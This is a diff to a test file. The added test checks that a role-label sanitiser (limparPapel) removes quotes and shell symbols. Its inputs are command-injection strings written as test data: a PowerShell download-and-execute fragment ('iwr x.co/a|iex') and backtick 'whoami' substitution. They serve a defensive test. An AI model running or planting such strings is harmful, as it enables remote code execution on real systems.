@@ -112,8 +112,14 @@ describe('apresentacao do time (T29.1)', () => {
     repos: [...repos, copia('c1', 'claude-1'), copia('c2', 'claude-2')],
   })
 
+  it('R1.1: limparPapel tira aspas e simbolos de comando, mantem acento e - _ . / ( ) +', () => {
+    expect(limparPapel('Revisor’;iwr x.co/a|iex;’')).toBe('Revisor iwr x.co/a iex')
+    expect(limparPapel("O'Neil $env:X `whoami`")).toBe('O Neil env X whoami')
+    expect(limparPapel('Front-end (React) / QA_2 + Revisão')).toBe('Front-end (React) / QA_2 + Revisão')
+  })
+
   it('limparPapel tira quebra de linha e controle e corta em 40', () => {
-    expect(limparPapel('  Re\nvisor\u001b[31m  ')).toBe('Re visor [31m')
+    expect(limparPapel('  Re\nvisor\u001b[31m  ')).toBe('Re visor 31m')
     expect(limparPapel('x'.repeat(60))).toHaveLength(40)
     expect(limparPapel('\n\t')).toBe('')
   })
